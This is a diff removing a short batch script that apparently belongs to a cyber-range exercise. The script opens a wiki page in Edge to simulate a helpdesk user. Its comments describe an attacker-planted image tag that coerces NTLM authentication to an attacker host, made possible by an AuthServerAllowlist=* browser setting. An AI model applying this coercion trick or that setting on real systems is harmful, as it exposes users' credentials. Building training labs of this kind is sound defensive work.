@@ -1,7 +1,0 @@
-@echo off
-rem TLO M4.2: helpdesk_admin habitually opens the IT VPN runbook in the wiki.
-rem Rendering the page loads the attacker-planted <img src=//attacker> -> NTLM coercion
-rem (Edge/Chrome AuthServerAllowlist=* makes the browser auto-send NTLM to any host).
-start "" msedge --new-window --no-first-run --no-default-browser-check "{{ charlie_wiki_url }}"
-timeout /t 25 /nobreak >nul
-taskkill /im msedge.exe /f >nul 2>&1
